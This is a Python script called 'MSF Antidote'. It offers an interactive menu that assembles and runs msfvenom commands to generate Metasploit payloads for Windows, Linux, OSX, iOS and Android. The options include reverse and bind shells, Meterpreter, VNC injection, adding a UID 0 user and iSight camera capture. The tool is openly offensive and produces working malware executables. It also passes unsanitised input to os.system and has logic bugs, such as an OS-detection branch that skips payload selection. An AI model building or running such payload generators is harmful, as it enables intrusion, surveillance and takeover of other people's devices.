#!/usr/bin/env python3

import sys, os, subprocess




#Color Variables

black = '\u001b[30m'
red = '\u001b[31m'
green = '\u001b[32m'
yellow = '\u001b[33m'
blue = '\u001b[34m'
magenta = '\u001b[35m'
Cyan = '\u001b[36m'
white = '\u001b[37m'
normal = '\u001b[00m'

black_b = '\u001b[40m'
red_b = '\u001b[41m'
green_b = '\u001b[42m'
yellow_b = '\u001b[43m'
blue_b = '\u001b[44m'
magenta_b = '\u001b[45m'
cyan_b = '\u001b[46m'
white_b = '\u001b[47m'


def main():

    #Command Variables
    platform = ''
    architecture =''
    ip = ''
    port = ''
    stage = ''
    LHOST = ''
    LPORT = ''
    form= ''
    payload = ''
    output = ''
    plat = ''
    arch = ''

    #OS Detection
    detect_input = input('\nWelcome to MSF Antidote.  Would you like to enable OS detection? [Requires Nmap] (y/n)  ')

    if detect_input.lower() == 'y':
        ip_input = input('\nPlease enter the target IP: ')
        command = ['sudo', 'nmap', '-O', f'{ip_input}']
        p = subprocess.Popen(command, stdout=subprocess.PIPE)
        text = p.stdout.readlines()
        retcode = p.wait()

    #Platform Selection
    elif detect_input.lower() == 'n':
        platform_input = input('\nSelect your target platform:\n\n1) Windows\n\n2) Linux\n\n3) OSX\n\n4) Apple ios\n\n5) Android\n\n')
        os.system('clear')



    ### WINDOWS-----------------------------------------------------------------------------------------------------------------------------------------------------
        if platform_input == '1':
            platform = 'msfvenom -p windows/' 
            form = '-f exe'
            plat = '--platform windows'
            
        #Windows Architecture Input
            architecture_input = input('\nSelect Platform Architecture:\n\n1) x86\n\n2) x64')
            os.system('clear')
            if architecture_input == '1':
                arch = '-a x86'

        #Windows x86 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Spawn a piped command shell\n\n2) Upload an executable and run it\n\n3) Inject a VNC Dll via a reflective loader\n\n')
                os.system('clear')

                if payload_input == '1':
                    payload = 'shell/bind_tcp'
                elif payload_input == '2':
                    payload = 'upexec/bind_tcp'
                elif payload_input == '3':
                    payload = 'vncinject/bind_tcp'

        #Windows x64 Payload Input
            elif architecture_input == '2':
                architecture = 'x64/'
                arch = 'x64'

        #Windows x64 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Listen for a connection and spawn a command shell\n\n2) Connect back to attacker and spawn a command shell\n\n3) Inject a VNC Dll via a reflective loader\n\n')
                os.system('clear')  

                if payload_input == '1':
                    payload = 'shell_bind_tcp'
                elif payload_input == '2':
                    payload = 'shell_reverse_tcp'
                elif payload_input == '3':
                    payload = 'vncinject/bind_tcp '   



    ### LINUX-------------------------------------------------------------------------------------------------------------------------------------------------------
        if platform_input == '2':
            platform = 'msfvenom -p linux/' 
            form = '-f elf'
            plat = '--platform linux'                 
    
        #Linux Architecture Input
            architecture_input = input('\nSelect Platform Architecture:\n\n1) x86\n\n2) x64')
            os.system('clear')
            if architecture_input == '1':
                architecture = 'x86/'
                arch = '-a x86'

        #Linux x86 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Create a new user with UID 0\n\n2) Execute an arbitrary command or just a /bin/sh shell\n\n3) Connect back to attacker and spawn a command shell\n\n')
                os.system('clear')

                if payload_input == '1':
                    payload = 'adduser'
                elif payload_input == '2':
                    payload = 'exec'
                elif payload_input == '3':
                    payload = 'shell_reverse_tcp'

        #Linux x64 Payload Input
            elif architecture_input == '2':
                architecture = 'x64/'
                arch = '-a x64'

        #Linux x64 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Execute an arbitrary command or just a /bin/sh shell\n\n2) Accept a connection from attacker and report UUID\n\n3) Connect back to attacker and spawn a command shell\n\n')
                os.system('clear')  

                if payload_input == '1':
                    payload = 'exec'
                elif payload_input == '2':
                    payload = 'pingback_bind_tcp'
                elif payload_input == '3':
                    payload = 'shell_reverse_tcp'



    ### OSX-----------------------------------------------------------------------------------------------------------------------------------------------------------
        if platform_input == '3':
            platform = 'msfvenom -p osx/' 
            form = '-f macho'
            plat = '--platform osx'
            
        #OSX Architecture Input
            architecture_input = input('\nSelect Platform Architecture:\n\n1) x86\n\n2) x64')
            os.system('clear')
            if architecture_input == '1':
                architecture = 'x86/'
                arch = '-a x86'

        #OSX x86 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Execute an arbitrary command\n\n2) Connect back to attacker and spawn a command shell\n\n3) Inject a Mach-O bundle to capture a photo from the iSight\n\n')
                os.system('clear')

                if payload_input == '1':
                    payload = 'exec'
                elif payload_input == '2':
                    payload = 'shell_reverse_tcp'
                elif payload_input == '3':
                    payload = 'isight/reverse_tcp'

        #OSX x64 Payload Input
            elif architecture_input == '2':
                architecture = 'x64/'
                arch = '-a x64'

        #OSX x64 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Execute an arbitrary command\n\n2) Say an arbitrary string outloud using Mac OS X text2speech\n\n3) Connect back to attacker and spawn a command shell\n\n')
                os.system('clear')  

                if payload_input == '1':
                    payload = 'exec '
                elif payload_input == '2':
                    payload = 'say'
                elif payload_input == '3':
                    payload = 'shell_reverse_tcp '                    



    ### Apple ios-----------------------------------------------------------------------------------------------------------------------------------------------------------
        if platform_input == '4':
            platform = 'msfvenom -p apple_ios/' 
            plat = '--platform apple_ios'
            
        #Apple ios Architecture Input
            architecture_input = input('\nSelect Platform Architecture:\n\n1) aarch64\n\n2) armle')
            os.system('clear')
            if architecture_input == '1':
                architecture = 'aarch64/'
                arch = '-a aarch64'

        #Apple ios x86 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Run the Meterpreter / Mettle server payload\n\n2) Connect back to attacker and spawn a command shell\n\n')
                os.system('clear')

                if payload_input == '1':
                    payload = 'meterpreter_reverse_http'
                elif payload_input == '2':
                    payload = 'shell_reverse_tcp'

        #Apple ios x64 Payload Input
            elif architecture_input == '2':
                architecture = 'armle/'
                arch = '-a armle'

        #Apple ios x64 Payload Input
                payload_input = input('Select from available payloads:\n\n1) Run the Meterpreter / Mettle server payload\n\n')
                os.system('clear')  

                if payload_input == '1':
                    payload = 'meterpreter_reverse_tcp'                                  



    ### ANDROID-----------------------------------------------------------------------------------------------------------------------------------------------------------
        if platform_input == '5':
            platform = 'msfvenom -p android/'   
            plat = '--platform android'
        
        #Android Payload Input
            payload_input = input('Select from available payloads:\n\n1) Run a meterpreter server in Android. Connect back stager\n\n2) Spawn a piped command shell (sh). Connect back stager\n\n')
            os.system('clear')  

            if payload_input == '1':
                    payload = 'meterpreter/reverse_tcp'
            elif payload_input == '2':
                    payload = 'shell/reverse_tcp '



    #Port and IP Input
    ip_input = input('\nEnter Target IP: \n\n')
    LHOST = f'LHOST={ip_input}'
    os.system('clear')

    port_input = input('\nEnter Target Port: \n\n')
    LPORT = f'LPORT={port_input}'   
    os.system('clear')




    #File Output
    output = input('\nPlease Name Your File: ')
    output = f'> {output}'
    os.system('clear')

    #Final Command       
    cmd = f'{platform}{architecture}{payload} {plat} {arch} {LHOST} {LPORT} {form} {output}'

    os.system(cmd)
    print(cmd)

    #Repeat or exit
    repeat = input('\n\nWould you like to create another payload?  (y/n): \n\n')
    if repeat.lower() == "y":
        main()
    else:
        print('\nGood Bye')
        exit()
  
  
  ### DUNDER CHECK ###
if __name__ == "__main__":
  main()